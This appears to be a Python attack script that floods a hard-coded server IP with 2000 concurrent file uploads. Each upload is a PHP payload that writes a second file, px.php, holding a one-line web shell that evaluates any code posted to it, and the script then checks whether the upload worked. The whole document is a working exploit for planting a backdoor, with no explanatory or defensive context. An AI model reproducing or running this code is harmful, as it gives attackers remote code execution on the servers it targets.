# -*- coding:utf-8 -*-
from concurrent.futures import ThreadPoolExecutor
import requests


def td(list):
    url = 'http://218.94.126.122:17052/'
    files = {
        ' upload_file': "<?php fputs(fopen('px.php', 'w'), '<?php @eval($_POST[1])?>'); ?>"
    }
    data = {'submit': '上传'}
    r = requests.post(url=url, data=data, files=files)
    re = requests.get('http://218.94.126.122:17052/upload/up.php')
    if re.status_code == 200:
        print('上传成功')


if __name__ == '__main__':
    with ThreadPoolExecutor(200) as p:
        p.map(td, range(2000))
